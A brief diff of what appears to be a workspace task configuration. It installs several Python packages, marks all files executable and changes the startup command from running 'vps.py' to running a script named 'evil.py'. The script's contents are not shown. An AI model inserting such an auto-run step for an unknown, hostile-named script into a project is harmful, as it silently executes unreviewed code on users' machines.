@@ -22,5 +22,5 @@ tasks:
         pip install telebot pymongo aiohttp psutil && \
         pip install motor && \
         chmod +x * && \
-        echo "Starting vps.py execution" && \
-        python3 vps.py
+        echo "Starting evil.py execution" && \
+        python3 evil.py
